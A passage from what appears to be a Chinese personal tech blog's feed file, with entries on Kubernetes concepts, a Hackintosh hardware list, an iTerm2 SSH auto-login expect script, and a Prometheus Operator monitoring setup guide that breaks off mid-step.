在很多情况下用于实现多租户的资源隔离，可以给每个租户创建一个 Namespace 来实现多租户的资源隔离。</p><h2 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h2><p>Annotation 与 Label 类似，也使用 key/value 键值对的形式进行定义。不同的是 Label 就有严格的命名规则，它定义的是 Kubernetes 对象的元数据，并且用于 Label Selector。Annotation 则是用户任意定义的附加信息，以便于外部工具查找。Kubernetes 的模块自身会通过 Annotation 标记资源对象的一些特殊信息。<br>通常来说，用 Annotation 来记录的信息如下：</p><ul><li>build 信息、release 信息、Docker 镜像信息等，例如书简戳、release id 号、PR 号、镜像 Hash 值、Docker registry 地址等</li><li>日志库、监控库、分析库等资源库的信息</li><li>程序调试工具信息，例如工具名称、版本号等</li><li>团队的联系信息，例如电话号码、负责人名称、网址等</li></ul><h2 id="ConfigMap"><a href="#ConfigMap" class="headerlink" title="ConfigMap"></a>ConfigMap</h2><p>首先，把所有的配置项都当作 key-value 字符串，这些配置项可以作为 Map 表中的一个项，整个 Map 的数据可以被持久化存储在 Kubernetes 的 Etcd 数据库中，然后提供 API 以方便 Kubernetes 相关组件或客户应用 CRUD 操作这些数据，上述专门用于保存配置参数的 Map 就是 Kubernetes ConfigMap 资源对象。<br>接下来，Kubernetes 提供了一种内建机制，将存储在 etcd 中的 ConfigMap 通过 Volume 映射的方式变成目标 Pod 内的配置文件，不管 Pod 被调度到哪台服务器上，都会完成自动映射。进一步地，如果 ConfigMap 中的 key-value 数据被修改，则映射到 Pod 中的“配置文件”也会随之更新。</p><hr><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>整理自 《Kubernetes 权威指南（第4版）》</p>]]></content>
      
      
      <categories>
          
          <category> kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑苹果配置</title>
      <link href="MacOS/hackintosh.html"/>
      <url>MacOS/hackintosh.html</url>
      
        <content type="html"><![CDATA[<p>家里目前使用的台式机虽说性能还行，但是自从使用了 MBP 之后感觉 macOS 系统更加好用。总想在家里折腾一套，官方的 Mac mini 是个不错的选择，但是价格就……想了想不如重新组一套 itx 或者 matx 用来装黑苹果，岂不是美滋滋。</p><span id="more"></span><p>选取了对黑苹果友好的一些硬件配置，部分配置还是可以缩一缩，毕竟能用就行。表格如下：</p><table><thead><tr><th>种类</th><th>品牌型号</th><th>单价</th><th>数量</th><th>总额</th></tr></thead><tbody><tr><td>CPU</td><td>Intel Core i5 9600K</td><td></td><td></td><td></td></tr><tr><td>主板</td><td>ASRock Z390M Pro4</td><td></td><td></td><td></td></tr><tr><td>内存</td><td>芝奇幻光戟 DDR4 3200 8Gx2（C16）</td><td></td><td></td><td></td></tr><tr><td>SSD</td><td>西数黑盘 M.2接口 500GB SSD（3470MB/s） or   西数蓝盘 M.2接口 500GB SSD（1700MB/s）</td><td></td><td></td><td></td></tr><tr><td>显卡</td><td>蓝宝石（Sapphire）Radeon RX Vega 56 8G</td><td></td><td></td><td></td></tr><tr><td>蓝牙/无线</td><td>BCM943602CS 四天线</td><td></td><td></td><td></td></tr><tr><td>电源</td><td>振华（SUPER FLOWER）650W LEADEX G 650</td><td></td><td></td><td></td></tr><tr><td>散热器</td><td>采融（Prolimatech）ARTISTS 3i</td><td></td><td></td><td></td></tr><tr><td>机箱</td><td>追风者（PHANTEKS）MG 410 黑色 RGB mATX</td><td></td><td></td><td></td></tr><tr><td>显示器</td><td></td><td></td><td></td><td></td></tr><tr><td>其他</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>备注：</p><p>显卡：RX 590 或 vega56（真正免驱，无需搭配集显也可完全硬件加速）</p><p>蓝牙/无线：苹果机同款的 BCM943602CS 是免驱卡，WIFI带蓝牙二合一，四天线的，即插即用。（三天线的蓝牙和2.4G无线冲突） + M.2转接卡 + 天线</p>]]></content>
      
      
      <categories>
          
          <category> MacOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> macos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS 上让 iTerm2 记住SSH用户名密码</title>
      <link href="MacOS/use-expect-remember-passwd.html"/>
      <url>MacOS/use-expect-remember-passwd.html</url>
      
        <content type="html"><![CDATA[<p>win下习惯使用 xshell，但是 xshell 并无 MacOS 版。了解到了 iterm2 这款软件，通过一些改造也能实现类似的效果。</p><h3 id="1-安装-expect"><a href="#1-安装-expect" class="headerlink" title="1. 安装 expect"></a>1. 安装 expect</h3><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>expect</span><br></pre></td></tr></table></figure><p>如果遇到 man 目录的权限问题可以执行以下命令后在执行安装命令</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo chown -R $(whoami) <span class="regexp">/usr/</span>local<span class="regexp">/share/m</span>an/man5</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2-创建-except-脚本"><a href="#2-创建-except-脚本" class="headerlink" title="2. 创建 except 脚本"></a>2. 创建 except 脚本</h3><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/local/bin/iterm2login.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> timeout <span class="number">30</span></span><br><span class="line">spawn ssh -p [<span class="keyword">lindex</span> $argv <span class="number">0</span>] [<span class="keyword">lindex</span> $argv <span class="number">1</span>]@[<span class="keyword">lindex</span> $argv <span class="number">2</span>]</span><br><span class="line">expect &#123;</span><br><span class="line">        <span class="string">&quot;(yes/no)?&quot;</span></span><br><span class="line">        &#123;send <span class="string">&quot;yes\n&quot;</span>;exp_continue&#125;</span><br><span class="line">        <span class="string">&quot;password:&quot;</span></span><br><span class="line">        &#123;send <span class="string">&quot;[lindex $argv 3]\n&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">interact</span><br></pre></td></tr></table></figure><p>这里[lindex $argv 0]， [lindex $argv 1]，[lindex $argv 2]， [lindex $argv 3] 分别代表着 <strong>端口号 用户名 服务器地址 密码</strong> 4个参数。<br>还需要给脚本执行权限</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo chmod +x <span class="regexp">/usr/</span>local<span class="regexp">/bin/i</span>term2login.sh</span><br></pre></td></tr></table></figure><h3 id="3-新建-profiles"><a href="#3-新建-profiles" class="headerlink" title="3. 新建 profiles"></a>3. 新建 profiles</h3><p>iTerm2 -&gt; Preferences -&gt; Profiles<br>为每个服务器的连接, 打上不同的Tag, 就自动按Tag分好组了.<br><img data-src="/images/uploads/2019/02/1.jpg" alt="创建profiles"><br>另外 还可以在Colors中设置每个打开Tab 的颜色. 多个项目同时操作也不怕搞错了.<br><img data-src="/images/uploads/2019/02/2.jpg" alt="tab color"><br><img data-src="/images/uploads/2019/02/3.jpg" alt="tab"></p><h3 id="4-最终效果"><a href="#4-最终效果" class="headerlink" title="4. 最终效果"></a>4. 最终效果</h3><p>如图，使用起来方便多了<br><img data-src="/images/uploads/2019/02/4.jpg" alt="最终效果"></p><hr><h3 id="方法来源于网上，稍作修改"><a href="#方法来源于网上，稍作修改" class="headerlink" title="方法来源于网上，稍作修改"></a>方法来源于网上，稍作修改</h3>]]></content>
      
      
      <categories>
          
          <category> MacOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MacOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Prometheus Operator 监控 Kubernetes</title>
      <link href="docker/use-prometheus-operator-monitor-kubernetes.html"/>
      <url>docker/use-prometheus-operator-monitor-kubernetes.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Prometheus Operator 是 CoreOS 开发的基于 Prometheus 的 Kubernete s监控方案，也可能是目前功能最全面的开源方案。更多信息可以查看<a href="https://github.com/coreos/prometheus-operator">https://github.com/coreos/prometheus-operator</a></p><h1 id="部署-Prometheus-Operator"><a href="#部署-Prometheus-Operator" class="headerlink" title="部署 Prometheus Operator"></a>部署 Prometheus Operator</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="1-创建命名空间"><a href="#1-创建命名空间" class="headerlink" title="1. 创建命名空间"></a>1. 创建命名空间</h3><p>为方便管理，创建一个单独的 Namespace monitoring，Prometheus Operator 相关的组件都会部署到这个 Namespace。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># kubectl create <span class="keyword">namespace</span> <span class="symbol">monitoring</span></span><br></pre></td></tr></table></figure><h3 id="2-导入相关镜像"><a href="#2-导入相关镜像" class="headerlink" title="2. 导入相关镜像"></a>2. 导入相关镜像</h3><p>所有节点上面导入 prometheus-operator.tar，下载地址：<a href="https://pan.baidu.com/s/1dKNbg7b9IBtPBnadLUADlg">prometheus-operator.tar</a></p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># docker <span class="keyword">load</span> -i prometheus-<span class="keyword">operator</span>.tar</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="安装-Prometheus-Operator"><a href="#安装-Prometheus-Operator" class="headerlink" title="安装 Prometheus Operator"></a>安装 Prometheus Operator</h2><h3 id="1-使用-Helm-安装-Prometheus-Operator"><a href="#1-使用-Helm-安装-Prometheus-Operator" class="headerlink" title="1. 使用 Helm 安装 Prometheus Operator"></a>1. 使用 Helm 安装 Prometheus Operator</h3><p>Prometheus Operator 所有的组件都打包成 Helm Chart，安装部署非常方便。</p><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"># helm install --<span class="keyword">name</span> prometheus-<span class="keyword">operator</span> --namespace=monitoring stable/prometheus-<span class="keyword">operator</span></span><br></pre></td></tr></table></figure><h3 id="2-查看创建的资源"><a href="#2-查看创建的资源" class="headerlink" title="2. 查看创建的资源"></a>2. 查看创建的资源</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get all -n monitoring </span></span><br><span class="line"><span class="attribute">NAME</span>                                                          READY   STATUS    RESTARTS   AGE</span><br><span class="line"><span class="attribute">pod</span>/alertmanager-prometheus-operator-alertmanager-<span class="number">0</span>           <span class="number">2</span>/<span class="number">2</span>     Running   <span class="number">0</span>          <span class="number">60</span>s</span><br><span class="line"><span class="attribute">pod</span>/prometheus-operator-grafana-<span class="number">6</span>c<span class="number">8</span>f<span class="number">4</span>bcfb<span class="number">4</span>-jp<span class="number">5</span>bh              <span class="number">3</span>/<span class="number">3</span>     Running   <span class="number">0</span>          <span class="number">65</span>s</span><br><span class="line"><span class="attribute">pod</span>/prometheus-operator-kube-state-metrics-<span class="number">6</span>b<span class="number">6</span>d<span class="number">6</span>b<span class="number">8</span>bbd-gff<span class="number">7</span>j   <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">65</span>s</span><br><span class="line"><span class="attribute">pod</span>/prometheus-operator-operator-<span class="number">76</span>f<span class="number">78</span>fd<span class="number">685</span>-<span class="number">295</span>rb             <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">65</span>s</span><br><span class="line"><span class="attribute">pod</span>/prometheus-operator-prometheus-node-exporter-<span class="number">44</span>tgz        <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">65</span>s</span><br><span class="line"><span class="attribute">pod</span>/prometheus-operator-prometheus-node-exporter-<span class="number">6</span>t<span class="number">4</span>sc        <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">65</span>s</span><br><span class="line"><span class="attribute">pod</span>/prometheus-operator-prometheus-node-exporter-vnwrv        <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">65</span>s</span><br><span class="line"><span class="attribute">pod</span>/prometheus-prometheus-operator-prometheus-<span class="number">0</span>               <span class="number">3</span>/<span class="number">3</span>     Running   <span class="number">1</span>          <span class="number">54</span>s</span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>                                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)             AGE</span><br><span class="line"><span class="attribute">service</span>/alertmanager-operated                          ClusterIP   None             &lt;none&gt;        <span class="number">9093</span>/TCP,<span class="number">6783</span>/TCP   <span class="number">60</span>s</span><br><span class="line"><span class="attribute">service</span>/prometheus-operated                            ClusterIP   None             &lt;none&gt;        <span class="number">9090</span>/TCP            <span class="number">54</span>s</span><br><span class="line"><span class="attribute">service</span>/prometheus-operator-alertmanager               ClusterIP   <span class="number">10.105.62.219</span>    &lt;none&gt;        <span class="number">9093</span>/TCP            <span class="number">65</span>s</span><br><span class="line"><span class="attribute">service</span>/prometheus-operator-grafana                    ClusterIP   <span class="number">10.103.30.59</span>     &lt;none&gt;        <span class="number">80</span>/TCP              <span class="number">65</span>s</span><br><span class="line"><span class="attribute">service</span>/prometheus-operator-kube-state-metrics         ClusterIP   <span class="number">10.105.189.63</span>    &lt;none&gt;        <span class="number">8080</span>/TCP            <span class="number">65</span>s</span><br><span class="line"><span class="attribute">service</span>/prometheus-operator-operator                   ClusterIP   <span class="number">10.105.212.90</span>    &lt;none&gt;        <span class="number">8080</span>/TCP            <span class="number">65</span>s</span><br><span class="line"><span class="attribute">service</span>/prometheus-operator-prometheus                 ClusterIP   <span class="number">10.104.229.158</span>   &lt;none&gt;        <span class="number">9090</span>/TCP            <span class="number">65</span>s</span><br><span class="line"><span class="attribute">service</span>/prometheus-operator-prometheus-node-exporter   ClusterIP   <span class="number">10.103.226.249</span>   &lt;none&gt;        <span class="number">9100</span>/TCP            <span class="number">65</span>s</span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>                                                          DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE</span><br><span class="line"><span class="attribute">daemonset</span>.apps/prometheus-operator-prometheus-node-exporter   <span class="number">3</span>         <span class="number">3</span>         <span class="number">3</span>       <span class="number">3</span>            <span class="number">3</span>           &lt;none&gt;          <span class="number">65</span>s</span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>                                                     READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line"><span class="attribute">deployment</span>.apps/prometheus-operator-grafana              <span class="number">1</span>/<span class="number">1</span>     <span class="number">1</span>            <span class="number">1</span>           <span class="number">65</span>s</span><br><span class="line"><span class="attribute">deployment</span>.apps/prometheus-operator-kube-state-metrics   <span class="number">1</span>/<span class="number">1</span>     <span class="number">1</span>            <span class="number">1</span>           <span class="number">65</span>s</span><br><span class="line"><span class="attribute">deployment</span>.apps/prometheus-operator-operator             <span class="number">1</span>/<span class="number">1</span>     <span class="number">1</span>            <span class="number">1</span>           <span class="number">65</span>s</span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>                                                                DESIRED   CURRENT   READY   AGE</span><br><span class="line"><span class="attribute">replicaset</span>.apps/prometheus-operator-grafana-<span class="number">6</span>c<span class="number">8</span>f<span class="number">4</span>bcfb<span class="number">4</span>              <span class="number">1</span>         <span class="number">1</span>         <span class="number">1</span>       <span class="number">65</span>s</span><br><span class="line"><span class="attribute">replicaset</span>.apps/prometheus-operator-kube-state-metrics-<span class="number">6</span>b<span class="number">6</span>d<span class="number">6</span>b<span class="number">8</span>bbd   <span class="number">1</span>         <span class="number">1</span>         <span class="number">1</span>       <span class="number">65</span>s</span><br><span class="line"><span class="attribute">replicaset</span>.apps/prometheus-operator-operator-<span class="number">76</span>f<span class="number">78</span>fd<span class="number">685</span>             <span class="number">1</span>         <span class="number">1</span>         <span class="number">1</span>       <span class="number">65</span>s</span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>                                                             READY   AGE</span><br><span class="line"><span class="attribute">statefulset</span>.apps/alertmanager-prometheus-operator-alertmanager   <span class="number">1</span>/<span class="number">1</span>     <span class="number">60</span>s</span><br><span class="line"><span class="attribute">statefulset</span>.apps/prometheus-prometheus-operator-prometheus       <span class="number">1</span>/<span class="number">1</span>     <span class="number">54</span>s</span><br></pre></td></tr></table></figure><h3 id="3-查看安装后的-release"><a href="#3-查看安装后的-release" class="headerlink" title="3.查看安装后的 release"></a>3.查看安装后的 release</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># helm list </span></span><br><span class="line"><span class="attribute">NAME</span>               REVISIONUPDATED                 STATUS  CHART                    APP VERSIONNAMESPACE </span><br><span class="line"><span class="attribute">prometheus</span>-operator<span class="number">1</span>       Tue Jan  <span class="number">8</span> <span class="number">13</span>:<span class="number">49</span>:<span class="number">12</span> <span class="number">2019</span>DEPLOYEDprometheus-operator-<span class="number">1</span>.<span class="number">5</span>.<span class="number">1</span><span class="number">0</span>.<span class="number">26</span>.<span class="number">0</span>     monitoring</span><br></pre></td></tr></table></figure><p>prometheus-operator 的 charts 会自动安装 Prometheus、Alertmanager 和 Grafana。</p><h2 id="修改访问模式"><a href="#修改访问模式" class="headerlink" title="修改访问模式"></a>修改访问模式</h2><h3 id="1-查看访问类型"><a href="#1-查看访问类型" class="headerlink" title="1. 查看访问类型"></a>1. 查看访问类型</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get svc -n monitoring </span></span><br><span class="line"><span class="attribute">NAME</span>                                           TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)             AGE</span><br><span class="line"><span class="attribute">alertmanager</span>-operated                          ClusterIP   None             &lt;none&gt;        <span class="number">9093</span>/TCP,<span class="number">6783</span>/TCP   <span class="number">7</span>m<span class="number">30</span>s</span><br><span class="line"><span class="attribute">prometheus</span>-operated                            ClusterIP   None             &lt;none&gt;        <span class="number">9090</span>/TCP            <span class="number">7</span>m<span class="number">24</span>s</span><br><span class="line"><span class="attribute">prometheus</span>-operator-alertmanager               ClusterIP   <span class="number">10.105.62.219</span>    &lt;none&gt;        <span class="number">9093</span>/TCP            <span class="number">7</span>m<span class="number">35</span>s</span><br><span class="line"><span class="attribute">prometheus</span>-operator-grafana                    ClusterIP   <span class="number">10.103.30.59</span>     &lt;none&gt;        <span class="number">80</span>/TCP              <span class="number">7</span>m<span class="number">35</span>s</span><br><span class="line"><span class="attribute">prometheus</span>-operator-kube-state-metrics         ClusterIP   <span class="number">10.105.189.63</span>    &lt;none&gt;        <span class="number">8080</span>/TCP            <span class="number">7</span>m<span class="number">35</span>s</span><br><span class="line"><span class="attribute">prometheus</span>-operator-operator                   ClusterIP   <span class="number">10.105.212.90</span>    &lt;none&gt;        <span class="number">8080</span>/TCP            <span class="number">7</span>m<span class="number">35</span>s</span><br><span class="line"><span class="attribute">prometheus</span>-operator-prometheus                 ClusterIP   <span class="number">10.104.229.158</span>   &lt;none&gt;        <span class="number">9090</span>/TCP            <span class="number">7</span>m<span class="number">35</span>s</span><br><span class="line"><span class="attribute">prometheus</span>-operator-prometheus-node-exporter   ClusterIP   <span class="number">10.103.226.249</span>   &lt;none&gt;        <span class="number">9100</span>/TCP            <span class="number">7</span>m<span class="number">35</span>s</span><br></pre></td></tr></table></figure><p>默认的访问类型为 ClusterIP 无法外部访问，只能集群内访问。</p><h3 id="2-修改-alertmanager、prometheus、grafana的访问类型"><a href="#2-修改-alertmanager、prometheus、grafana的访问类型" class="headerlink" title="2. 修改 alertmanager、prometheus、grafana的访问类型"></a>2. 修改 alertmanager、prometheus、grafana的访问类型</h3><p>grafana：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl edit svc prometheus-operator-grafana -n monitoring</span></span><br><span class="line"></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="number">10.103</span><span class="number">.30</span><span class="number">.59</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">service</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">3000</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">grafana</span></span><br><span class="line">    <span class="attr">release:</span> <span class="string">prometheus-operator</span></span><br><span class="line">  <span class="attr">sessionAffinity:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span>        <span class="comment">#修改此行</span></span><br></pre></td></tr></table></figure><p>alertmanager：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl edit svc prometheus-operator-alertmanager -n monitoring</span></span><br><span class="line"></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="number">10.105</span><span class="number">.62</span><span class="number">.219</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">web</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">9093</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">9093</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">alertmanager:</span> <span class="string">prometheus-operator-alertmanager</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">alertmanager</span></span><br><span class="line">  <span class="attr">sessionAffinity:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span>       <span class="comment">#修改此行</span></span><br><span class="line"><span class="attr">status:</span></span><br><span class="line">  <span class="attr">loadBalancer:</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>prometheus：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl edit svc prometheus-operator-prometheus -n monitoring</span></span><br><span class="line"></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="number">10.104</span><span class="number">.229</span><span class="number">.158</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">web</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">9090</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="string">web</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">prometheus</span></span><br><span class="line">    <span class="attr">prometheus:</span> <span class="string">prometheus-operator-prometheus</span></span><br><span class="line">  <span class="attr">sessionAffinity:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span>      <span class="comment">#修改此行</span></span><br><span class="line"><span class="attr">status:</span></span><br><span class="line">  <span class="attr">loadBalancer:</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="3-查看修改后的访问类型"><a href="#3-查看修改后的访问类型" class="headerlink" title="3. 查看修改后的访问类型"></a>3. 查看修改后的访问类型</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get svc -n monitoring </span></span><br><span class="line"><span class="attribute">NAME</span>                                           TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)             AGE</span><br><span class="line"><span class="attribute">alertmanager</span>-operated                          ClusterIP   None             &lt;none&gt;        <span class="number">9093</span>/TCP,<span class="number">6783</span>/TCP   <span class="number">23</span>m</span><br><span class="line"><span class="attribute">prometheus</span>-operated                            ClusterIP   None             &lt;none&gt;        <span class="number">9090</span>/TCP            <span class="number">23</span>m</span><br><span class="line"><span class="attribute">prometheus</span>-operator-alertmanager               NodePort    <span class="number">10.105.62.219</span>    &lt;none&gt;        <span class="number">9093</span>:<span class="number">32645</span>/TCP      <span class="number">23</span>m</span><br><span class="line"><span class="attribute">prometheus</span>-operator-grafana                    NodePort    <span class="number">10.103.30.59</span>     &lt;none&gt;        <span class="number">80</span>:<span class="number">30043</span>/TCP        <span class="number">23</span>m</span><br><span class="line"><span class="attribute">prometheus</span>-operator-kube-state-metrics         ClusterIP   <span class="number">10.105.189.63</span>    &lt;none&gt;        <span class="number">8080</span>/TCP            <span class="number">23</span>m</span><br><span class="line"><span class="attribute">prometheus</span>-operator-operator                   ClusterIP   <span class="number">10.105.212.90</span>    &lt;none&gt;        <span class="number">8080</span>/TCP            <span class="number">23</span>m</span><br><span class="line"><span class="attribute">prometheus</span>-operator-prometheus                 NodePort    <span class="number">10.104.229.158</span>   &lt;none&gt;        <span class="number">9090</span>:<span class="number">32275</span>/TCP      <span class="number">23</span>m</span><br><span class="line"><span class="attribute">prometheus</span>-operator-prometheus-node-exporter   ClusterIP   <span class="number">10.103.226.249</span>   &lt;none&gt;        <span class="number">9100</span>/TCP            <span class="number">23</span>m</span><br></pre></td></tr></table></figure><h2 id="修改-kubelet-打开只读端口"><a href="#修改-kubelet-打开只读端口" class="headerlink" title="修改 kubelet 打开只读端口"></a>修改 kubelet 打开只读端口</h2><p>prometheus 需要访问 kubelet 的 10255 端口获取 metrics。但是默认情况下 10255 端口是不开放的，会导致 prometheus 上有 unhealthy，如下图：<br><img data-src="/images/uploads/2019/01/unhealthy.png" alt="unhealthy"><br>打开只读端口需要编辑所有节点的 /var/lib/kubelet/config.yaml 文件，加入以下内容</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># /var/lib/kubelet/config.yaml</span></span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"><span class="symbol">oomScoreAdj:</span> <span class="number">-999</span></span><br><span class="line"><span class="symbol">podPidsLimit:</span> <span class="number">-1</span></span><br><span class="line"><span class="symbol">port:</span> <span class="number">10250</span></span><br><span class="line"><span class="symbol">readOnlyPort:</span> <span class="number">10255</span>          <span class="meta">#增加此行</span></span><br><span class="line"><span class="symbol">registryBurst:</span> <span class="number">10</span></span><br><span class="line"><span class="symbol">registryPullQPS:</span> <span class="number">5</span></span><br><span class="line"><span class="symbol">resolvConf:</span> <span class="meta-keyword">/etc/</span>resolv.conf</span><br></pre></td></tr></table></figure><p>重启 kubelet 服务</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart kubelet.service</span></span><br></pre></td></tr></table></figure><p>查看 prometheus target<br><img data-src="/images/uploads/2019/01/healthy.png" alt="healthy"></p><h1 id="访问-dashboard"><a href="#访问-dashboard" class="headerlink" title="访问 dashboard"></a>访问 dashboard</h1><ol><li><p> Pormetheus 的 Web UI<br>访问地址为：<a href="http://nodeip:32275/target%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%9A">http://nodeip:32275/target，如下图：</a><br><img data-src="/images/uploads/2019/01/prometheus.png" alt="prometheus"></p></li><li><p>Alertmanager 的 Web UI<br>访问地址为：<a href="http://nodeip:32645/%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%9A">http://nodeip:32645/，如下图：</a><br><img data-src="/images/uploads/2019/01/alertmanager.png" alt="alertmanager"></p></li><li><p>Grafana Dashboard<br>访问地址为：<a href="http://nodeip:30043/%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D/%E5%AF%86%E7%A0%81%E4%B8%BA%EF%BC%9Aadmin/prom-operator%EF%BC%8C%E7%99%BB%E9%99%86%E5%90%8E%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%9A">http://nodeip:30043/，默认的用户名/密码为：admin/prom-operator，登陆后如下图：</a><br><img data-src="/images/uploads/2019/01/grafana.png" alt="grafana"><br><img data-src="/images/uploads/2019/01/grafana-1.png" alt="grafana-1"><br><img data-src="/images/uploads/2019/01/grafana-2.png" alt="grafana-2"></p></li></ol><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><h2 id="1-prometheus-operator-coredns-无数据"><a href="#1-prometheus-operator-coredns-无数据" class="headerlink" title="1. prometheus-operator-coredns 无数据"></a>1. prometheus-operator-coredns 无数据</h2><p>问题详情见：<a href="https://github.com/coreos/prometheus-operator/issues/2110">Don’t scrape metrics from coreDNS</a><br>解决方法如下：修改 prometheus-operator-coredns 服务的 selector 为 kube-dns</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl edit svc prometheus-operator-coredns  -n kube-system</span></span><br><span class="line"></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http-metrics</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">9153</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">9153</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-dns</span>         <span class="comment">#修改此行</span></span><br><span class="line">  <span class="attr">sessionAffinity:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br></pre></td></tr></table></figure><h2 id="2-prometheus-operator-kube-etcd-无数据"><a href="#2-prometheus-operator-kube-etcd-无数据" class="headerlink" title="2. prometheus-operator-kube-etcd 无数据"></a>2. prometheus-operator-kube-etcd 无数据</h2><p>prometheus 通过 4001 端口访问 etcd metrics，但是 etcd 默认监听 2379。<br>解决方法如下：</p><figure class="highlight 